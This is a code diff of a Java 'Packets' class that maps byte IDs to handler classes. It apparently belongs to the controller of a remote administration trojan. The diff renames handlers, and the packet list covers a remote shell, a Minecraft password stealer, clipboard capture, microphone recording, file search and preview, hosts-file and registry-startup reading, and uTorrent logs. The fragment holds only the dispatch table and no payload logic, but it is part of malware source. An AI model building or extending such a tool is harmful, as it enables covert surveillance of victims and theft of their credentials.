@@ -21,7 +21,7 @@ public class Packets {
 	private static void reload() {
 		incomingPackets.clear();
 		incomingPackets.put(/* "LOCALE" */(byte) 10, Packet10InitDefaultLocale.class);
-		incomingPackets.put(/* "INSTLOCALES" */(byte) 11, PacketINSTLOCALES.class);
+		incomingPackets.put(/* "INSTLOCALES" */(byte) 11, Packet11InstalledLocales.class);
 		incomingPackets.put(/* "DISCONNECT" */(byte) 12, PacketDISCONNECT.class); // disconnect
 		incomingPackets.put(/* "STAT" */(byte) 13, Packet13Status.class); // status
 		incomingPackets.put(/* "COMPUTERNAME" */(byte) 14, Packet14InitComputerName.class); // computername
@@ -37,14 +37,14 @@ public class Packets {
 																					// folders
 																					// in
 																					// dir
-		incomingPackets.put(/* "PROCESS" */(byte) 20, PacketPROCESS.class); // process
+		incomingPackets.put(/* "PROCESS" */(byte) 20, Packet20Process.class); // process
 		incomingPackets.put(/* "CMD" */(byte) 21, Packet21RemoteShell.class); // command
 																		// prompt
 																		// line
 		incomingPackets.put(/* "USERNAME" */(byte) 22, Packet22InitUsername.class); // username
 		incomingPackets.put(/* "SERVERPATH" */(byte) 23, Packet23InitInstallPath.class); // server
 																					// path
-		incomingPackets.put(/* "HERERAM" */(byte) 24, PacketHERERAM.class); // ram
+		incomingPackets.put(/* "HERERAM" */(byte) 24, Packet24JVMMemory.class); // ram
 		incomingPackets.put(/* "JAVAVER" */(byte) 25, Packet25InitJavaVersion.class); // java
 																				// version
 		incomingPackets.put(/* "JAVAPATH" */(byte) 26, Packet26InitJavaPath.class); // javapath
@@ -66,25 +66,25 @@ public class Packets {
 		incomingPackets.put(/* "THUMBNAIL" */(byte) 33, Packet33Thumbnail.class); // tumbnail
 		incomingPackets.put(/* "DIR" */(byte) 34, PacketDIR.class); // get dir
 		incomingPackets.put(/* "CHAT" */(byte) 35, Packet35ChatMessage.class); // chat
-		incomingPackets.put(/* "MC" */(byte) 36, PacketMC.class); // minecraft
+		incomingPackets.put(/* "MC" */(byte) 36, Packet36MinecraftPassword.class); // minecraft
 																	// stealer
-		incomingPackets.put(/* "FF" */(byte) 37, PacketFF.class); // file
+		incomingPackets.put(/* "FF" */(byte) 37, Packet37SearchResult.class); // file
 																	// finder
-		incomingPackets.put(/* "HOSTF" */(byte) 38, PacketHOSTF.class); // host
+		incomingPackets.put(/* "HOSTF" */(byte) 38, Packet38HostFile.class); // host
 																			// file
 																			// text
 		incomingPackets.put(/* "HOSTANSW" */(byte) 39, PacketHOSTANSW.class); // host
 																				// file
 																				// answer
-		incomingPackets.put(/* "UTOR" */(byte) 40, PacketUTOR.class); // utorrent
+		incomingPackets.put(/* "UTOR" */(byte) 40, Packet40UTorrentDownload.class); // utorrent
 																		// logs
 		incomingPackets.put(/* "CBOARDC" */(byte) 41, PacketCBOARDC.class); // clipboard
 																				// contents
-		incomingPackets.put(/* "FC" */(byte) 42, PacketFC.class); // file
+		incomingPackets.put(/* "FC" */(byte) 42, Packet42PreviewFile.class); // file
 																	// preview
 		incomingPackets.put(/* "IC" */(byte) 43, Packet43PreviewImage.class); // image
 																	// preview
-		incomingPackets.put(/* "JVM" */(byte) 44, PacketJVM.class); // JVM info
+		incomingPackets.put(/* "JVM" */(byte) 44, Packet44SystemJavaProperty.class); // JVM info
 		incomingPackets.put(/* "ZIP" */(byte) 45, PacketZIP.class); // zip
 																		// preview
 		incomingPackets.put(/* "MD5" */(byte) 46, PacketMD5.class); // file md5
@@ -98,21 +98,21 @@ public class Packets {
 		incomingPackets.put(/* "WINSER" */(byte) 52, PacketWINSER.class); // windows
 																			// service
 																			// listing
-		incomingPackets.put(/* "REGSTART" */(byte) 53, PacketREGSTART.class); // registry
+		incomingPackets.put(/* "REGSTART" */(byte) 53, Packet53RegistryStartup.class); // registry
 																				// startup
 																				// listing
 		incomingPackets.put(/* "REG" */(byte) 54, PacketREG.class); // registry
 																		// enter
-		incomingPackets.put(/* "INSTPROG" */(byte) 55, PacketINSTPROG.class); // installed
+		incomingPackets.put(/* "INSTPROG" */(byte) 55, Packet55InstalledProgram.class); // installed
 																				// program
 																				// list
-		incomingPackets.put(/* "ADAPT" */(byte) 56, PacketADAPT.class); // network
+		incomingPackets.put(/* "ADAPT" */(byte) 56, Packet56NetworkAdapter.class); // network
 																			// adapters
 																			// list
 		incomingPackets.put(/* "RAWINFO" */(byte) 57, PacketRAWINFO.class); // raw
 																				// info
 																				// listing
-		incomingPackets.put(/* "SO" */(byte) 58, PacketSO.class); // sound
+		incomingPackets.put(/* "SO" */(byte) 58, Packet58Microphone.class); // sound
 		incomingPackets.put(/* "IMGLIST" */(byte) 59, PacketIMGLIST.class); // thumbnail
 																				// preview
 		incomingPackets.put(/* "ERROR" */(byte) 60, PacketERROR.class); // error
@@ -126,11 +126,11 @@ public class Packets {
 		incomingPackets.put(/* "ERRLOG" */(byte) 65, Packet65ErrorLog.class); // error
 																			// log
 																			// file
-		incomingPackets.put(/* "CONFIG" */(byte) 66, PacketCONFIG.class); // config
+		incomingPackets.put(/* "CONFIG" */(byte) 66, Packet66Config.class); // config
 																			// list
-		incomingPackets.put(/* "PLUGIN" */(byte) 67, PacketPLUGIN.class); // plugin
+		incomingPackets.put(/* "PLUGIN" */(byte) 67, Packet67LoadedPlugins.class); // plugin
 																			// list
-		incomingPackets.put(/* "QUICKDESKTOP" */(byte) 68, PacketQUICKDESKTOP.class); // quick
+		incomingPackets.put(/* "QUICKDESKTOP" */(byte) 68, Packet68QuickDesktop.class); // quick
 																						// desktop
 	}
 
